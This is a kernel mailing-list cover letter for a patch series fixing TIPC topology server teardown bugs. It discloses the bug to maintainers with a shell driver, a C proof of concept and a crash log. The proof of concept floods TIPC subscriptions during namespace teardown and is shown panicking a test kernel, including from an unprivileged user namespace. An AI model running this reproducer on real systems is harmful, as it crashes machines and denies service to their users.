Received: from mail-pj2-f17.google.com (mail-pj2-f17.google.com [74.125.227.145])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2BB211C6FF5
	for <stable@vger.kernel.org>; Fri, 18 Sep 2026 09:21:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.145
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789723291; cv=none; b=T6iLRZ6pwbA2AIO9NEOvr8K9AMUYIMPLpTLU0nyMh79t81NTrm/PUjt2dK1L2agq+eRvWtOz1Zh43rIfcVrj3wkT7icSovCJ39bvQSaCuVUqdGp13QHZbduvAEXJ4K3NoFVaMqtJWvg9/Mhna5hXDM9E5ZPYDdFRIQ8lXBSXmLg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789723291; c=relaxed/simple;
	bh=zA71H+XKmHG7bF+w7NGclfrpmryAAD1Ig9ehUUo302A=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=A3rjQjWnda74/Nq/tyqhKZ+buX7h2BK3XI27Nj51KaG4QQ0/adt6sILDuE+d5VK0J27r/sHTs0uVMFmzijWYMJOCaBZm7llhMEJNMvnURapYA/2AcL06wa5swj3Ev0PVBAaj4w503pCtVuqNDpnt9vEWiH5YxErUASAqjZs4W5Y=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Q+C4mnIQ; arc=none smtp.client-ip=74.125.227.145
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Q+C4mnIQ"
Received: by mail-pj2-f17.google.com with SMTP id d9443c01a7336-2db1ca06a25so3383285ad.2
        for <stable@vger.kernel.org>; Fri, 18 Sep 2026 02:21:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789723289; x=1790328089; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Mly5Dxu0mfsTrvWw0/D0BE3Bqt5H5t1/6wpioo+ck4Y=;
        b=Q+C4mnIQdguANAwHj9/BxbPKd5iQg+od3CsGq2hoLuD4Xrwi8eHqxs6ZqLyTzCNiwX
         T9OvU9JDMIG3DihTscUTDXixsNf7Uol/g+tX9Zlm7RtEb5R5QrYubqVee5r8v9TuvChk
         vT9KKisWzlgU2Su5HUJWcrQLd4pxzZ/jTv+CzOTmfVca7bYuGrfpb2pLq0k+xSTUQp6A
         ZsFCox8H+G4CXRyse7omz/SU5c+nPnprE4o7C0AMOc02XIvxS5y7pLWxCShqUdfa50KZ
         zhzb6aaO5ndEeQgrL1H44ywjuWFnS7yA31JQd8ieOSHtGh9WYfWBjpwTfaEKOr08hf2/
         iLpA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789723289; x=1790328089;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Mly5Dxu0mfsTrvWw0/D0BE3Bqt5H5t1/6wpioo+ck4Y=;
        b=ofMXMHh3QhWJaVF07sK5s73rpSOcCz3xeC36w1MVmkZwLQDWR1nIl2ircMaSgJXXHu
         qmTmVh1zRDFgXNpeXt0Q/6lV1ow1ngYi+4RxxaCn5mNoQLFs00CKd9yEZWFA/NfDXOBK
         sHLQlMa+exIFZ2693pOganXgjmMsFYHFopXGGKJK3ErDMEOs2rpM2MLX1uTOReUCcNVq
         fgQIpZJojWYTa2+JqsWjHAjCnZTsXk6ZVYDuLpW3wQEJBiF15255GcB4oahi8lgz8Jj5
         HS7tijp9fNpYAK21tIr0aju7Ib513CIbRjsiT525on2Np4kgATs+2cp7FXEAc0nCP/j8
         XqJQ==
X-Forwarded-Encrypted: i=1; AKwUvBzOPrsSAK91bpiQpmcyR6CG57QMu6PM6UtTMgHVKE1fxq43PjQbhPbMopLOodiynw4neyiV4jE=@vger.kernel.org
X-Gm-Message-State: AFuF++nBJg4hMVz/KEORNpgzEyX+sHPHFPBFhlN6h+V5l903Zsy9arPA
	BfIafvhPPJo7Ua1+H7m4bwLlu0TpS0wChuwJDhhK+pfzi9kkpHI0utLg
X-Gm-Gg: AYBFou0bgrJtwfdA1UpNxxvyO6S7o9L/gqijDfaX2Vq6enwKrQkc5DLuKnGy7mH1xWD
	dc+doeAZgQT+OVrNf7mjtoS9JG/mRu61viVA4YYouzEE4e9vaI+VwoF1BpfWxhsxD9TeH0Ec5yH
	nNeZOgALzGxvqZlTLSkp992xYH+OK2ginZw//vtl+ST8u3V7/QdOXt9x7hInetsIXXuq6uVcfKh
	MMIPnZpfV9jKharlANFKxA2tvKa8Pocjhyts2nK9NtYcFdjjtBdLAYJssapCONG+XjWbwkDghrG
	Zwd6LZptIG6G0Qp+RKvEb1fyaiz7BHpk28q1YnzqOzqAwECWC/VJ5rLkni9MLJZ/f4VYBeA/q1v
	i8VKEU8Sr23iHjr0W8iFslbazJN0ReA2in6/WwH2D6x8ZhdZdYnUQwARep9N3Qdbb/BGBs7e7tN
	W848TIsZ2lqs/NdCJUC4qHCs83bQ4ThkfrRIYFylj42KVhVF0Ip84pR7DpwCn9nS3r/yTKPwN3X
	MI077mNF3o8e4vG7hSwlVGJr5/Au/GrLEqErkSIiQMfXpUU3vjjL4pBQcAH2TqJAj9SfDlCUfjA
X-Received: by 2002:a17:90b:3909:b0:39e:248e:fdeb with SMTP id 98e67ed59e1d1-39e54d10e41mr4446376a91.19.1789723288585;
        Fri, 18 Sep 2026 02:21:28 -0700 (PDT)
Received: from lenovo-thinkbook.lenovo.com (n11212025079.netvigator.com. [112.120.25.79])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6137e111sm677341a91.1.2026.09.18.02.21.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 18 Sep 2026 02:21:25 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: netdev@vger.kernel.org
Cc: Jon Maloy <jmaloy@redhat.com>,
	Tung Quang Nguyen <tung.quang.nguyen@est.tech>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Ying Xue <ying.xue@windriver.com>,
	Parthasarathy Bhuvaragan <parthasarathy.bhuvaragan@ericsson.com>,
	Kuniyuki Iwashima <kuniyu@google.com>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <enjou1224z@gmail.com>
Subject: [PATCH net 0/2] tipc: fix connection lifetime during netns teardown
Date: Fri, 18 Sep 2026 17:21:11 +0800
Message-ID: <cover.1789722780.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/tipc/topsrv.c. The bug is
reachable by an unprivileged user via user and network namespaces
(CLONE_NEWUSER|CLONE_NEWNET); the reproducer below also supports a
root mode.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

`tipc_topsrv_stop()` can tear the topology server down in two unsafe
ways. It destroys `srv->rcv_wq`/`srv->send_wq` while the listener
socket still has its data-ready callback and `sk_user_data` installed,
so `tipc_topsrv_listener_data_ready()` can still queue `srv->awork` on
a freed workqueue. It also walks `conn_idr` by incrementing a numeric
ID while holding `idr_lock`, which can scan a large range of unused IDs
without letting a connection's final reference release make progress,
and it can resurrect an entry whose last reference was already dropped.

Reproducer:

#!/bin/sh
set -eu

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"

ITERATIONS="${1:-6000}"
THREADS="${2:-4}"
RUNTIME_USEC="${3:-20000}"
MODE="${MODE:-root}"              # root | userns
STALL_TIMEOUT="${STALL_TIMEOUT:-20}"
CC_BIN="${CC:-gcc}"

cd "$SCRIPT_DIR"

"$CC_BIN" -O2 -Wall -pthread -o poc poc.c

if [ "${SET_PANIC_ON_RCU_STALL:-1}" = "1" ] && [ "$(id -u)" -eq 0 ]; then
	sysctl -w kernel.panic_on_rcu_stall=1 >/dev/null 2>&1 || true
	if [ -w /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout ]; then
		echo "$STALL_TIMEOUT" > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
	fi
fi

if [ "$MODE" = "userns" ]; then
	CMD="./poc --userns -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
else
	CMD="./poc -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
fi

echo "[*] running: $CMD"
exec sh -c "$CMD"


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------


#define _GNU_SOURCE

#include <errno.h>
#include <getopt.h>
#include <linux/tipc.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static atomic_int stop_flag;

struct run_cfg {
	int iterations;
	int threads;
	int runtime_usec;
	int ns_flags;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-i iterations] [-t threads] [-r runtime_usec] [--userns]\n"
		"  -i, --iterations   number of fork/teardown cycles (default: 6000)\n"
		"  -t, --threads      flood worker threads per cycle (default: 4)\n"
		"  -r, --runtime-us   worker runtime per cycle in usec (default: 20000)\n"
		"  -U, --userns       use CLONE_NEWUSER|CLONE_NEWNET (for non-root)\n",
		prog);
}

static void parse_args(int argc, char **argv, struct run_cfg *cfg)
{
	static const struct option long_opts[] = {
		{ "iterations", required_argument, NULL, 'i' },
		{ "threads", required_argument, NULL, 't' },
		{ "runtime-us", required_argument, NULL, 'r' },
		{ "userns", no_argument, NULL, 'U' },
		{ "help", no_argument, NULL, 'h' },
		{ 0, 0, 0, 0 },
	};
	int c;

	cfg->iterations = 6000;
	cfg->threads = 4;
	cfg->runtime_usec = 20000;
	cfg->ns_flags = CLONE_NEWNET;

	while ((c = getopt_long(argc, argv, "i:t:r:Uh", long_opts, NULL)) != -1) {
		switch (c) {
		case 'i':
			cfg->iterations = atoi(optarg);
			break;
		case 't':
			cfg->threads = atoi(optarg);
			break;
		case 'r':
			cfg->runtime_usec = atoi(optarg);
			break;
		case 'U':
			cfg->ns_flags = CLONE_NEWUSER | CLONE_NEWNET;
			break;
		case 'h':
		default:
			usage(argv[0]);
			exit(c == 'h' ? 0 : 1);
		}
	}

	if (cfg->iterations <= 0 || cfg->threads <= 0 || cfg->runtime_usec < 0) {
		usage(argv[0]);
		exit(1);
	}
}

static void *flood_worker(void *arg)
{
	uintptr_t tid = (uintptr_t)arg;
	struct sockaddr_tipc sa;
	struct tipc_subscr sub;

	memset(&sa, 0, sizeof(sa));
	sa.family = AF_TIPC;
	sa.addrtype = TIPC_SERVICE_ADDR;
	sa.scope = TIPC_NODE_SCOPE;
	sa.addr.name.name.type = TIPC_TOP_SRV;
	sa.addr.name.name.instance = TIPC_TOP_SRV;

	memset(&sub, 0, sizeof(sub));
	sub.seq.type = 0x20000 + (uint32_t)tid;
	sub.seq.lower = 1;
	sub.seq.upper = 1;
	sub.timeout = 0xffffffffu;
	sub.filter = TIPC_SUB_SERVICE;

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		int fd = socket(AF_TIPC, SOCK_SEQPACKET | SOCK_NONBLOCK, 0);

		if (fd < 0)
			continue;

		(void)connect(fd, (struct sockaddr *)&sa, sizeof(sa));
		(void)send(fd, &sub, sizeof(sub), MSG_DONTWAIT);
		close(fd);
	}

	return NULL;
}

static void run_one_iteration(const struct run_cfg *cfg)
{
	pthread_t *tids;
	int i;

	if (unshare(cfg->ns_flags) < 0)
		_exit(111);

	tids = calloc((size_t)cfg->threads, sizeof(*tids));
	if (!tids)
		_exit(1);

	atomic_store_explicit(&stop_flag, 0, memory_order_relaxed);
	for (i = 0; i < cfg->threads; i++)
		pthread_create(&tids[i], NULL, flood_worker,
			       (void *)(uintptr_t)(i + 1));

	usleep((useconds_t)cfg->runtime_usec);

	_exit(0);
}

int main(int argc, char **argv)
{
	struct run_cfg cfg;
	int i;
	int ns_failures = 0;

	parse_args(argc, argv, &cfg);

	for (i = 0; i < cfg.iterations; i++) {
		pid_t pid = fork();
		int st;

		if (pid == 0)
			run_one_iteration(&cfg);
		if (pid < 0)
			return 1;

		if (waitpid(pid, &st, 0) < 0)
			return 1;

		if (WIFEXITED(st) && WEXITSTATUS(st) == 111)
			ns_failures++;

		if ((i % 200) == 0)
			fprintf(stderr, "iter=%d ns_failures=%d\n", i, ns_failures);
	}

	if (ns_failures == cfg.iterations) {
		fprintf(stderr,
			"all iterations failed to create namespaces (EPERM likely)\n");
		return 2;
	}

	return 0;
}


------END poc.c--------

----BEGIN crash log----


[  292.540819][    C1] rcu: INFO: rcu_preempt self-detected stall on CPU
[  292.647997][    C1] Workqueue: tipc_rcv tipc_topsrv_accept
[  292.708934][    C0] Workqueue: netns cleanup_net
[  292.709097][    C0]  <TASK>
[  292.709101][    C0]  __radix_tree_lookup+0xb7/0x290
[  292.709134][    C0]  tipc_topsrv_exit_net+0x19c/0x4e0
[  292.709169][    C0]  ops_exit_list+0xc0/0x180
[  292.709192][    C0]  cleanup_net+0x5b9/0xbd0
[  292.709217][    C0]  process_one_work+0x981/0x1930
[  292.709275][    C0]  worker_thread+0x729/0x10e0
[  292.709314][    C0]  kthread+0x338/0x410
[  292.709364][    C0]  ret_from_fork_asm+0x11/0x20
[  292.709383][    C0]  </TASK>
[  292.831321][    C1] Kernel panic - not syncing: RCU Stall
[  292.834975][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996)
[  292.839167][    C1] Call Trace:
[  292.875653][    C1]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  292.906505][    C1]  tipc_topsrv_accept+0x104/0x300
[  292.909515][    C1]  process_one_work+0x981/0x1930
[  292.919937][    C1]  ret_from_fork+0x4b/0x80
[  292.926345][    C1] Kernel Offset: disabled
[  292.927571][    C1] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (2):
  tipc: stop the listener before draining connections
  tipc: make conn_idr teardown safe

 net/tipc/topsrv.c | 27 ++++++++++++++++++++-------
 1 file changed, 20 insertions(+), 7 deletions(-)


base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b
-- 
2.55.0

